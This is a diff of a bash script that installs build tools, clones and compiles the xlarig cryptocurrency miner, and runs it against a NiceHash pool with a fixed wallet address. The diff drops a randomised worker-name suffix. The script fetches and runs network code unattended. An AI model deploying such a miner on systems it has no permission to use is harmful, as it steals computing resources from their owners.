@@ -1,8 +1,7 @@
 #!/bin/bash
-
 apt update && apt-get install git build-essential cmake automake libtool autoconf libuv1-dev -y
 git clone https://github.com/scala-network/xlarig
 mkdir xlarig/build && cd xlarig/build
 cmake ..
 make -j$(nproc)
-./xlarig --donate-level 0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G.$(echo $(shuf -i 9-99 -n 1)-XRIG) -p x -a panthera -k --cpu-affinity 3 --cpu-priority 5 -t 2
+./xlarig --donate-level 0 -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 343QVQVLGBkJdmb2KPhzR6b3JyUFsXQb7G -p x -a panthera -k --cpu-affinity 3 --cpu-priority 5 -t 2
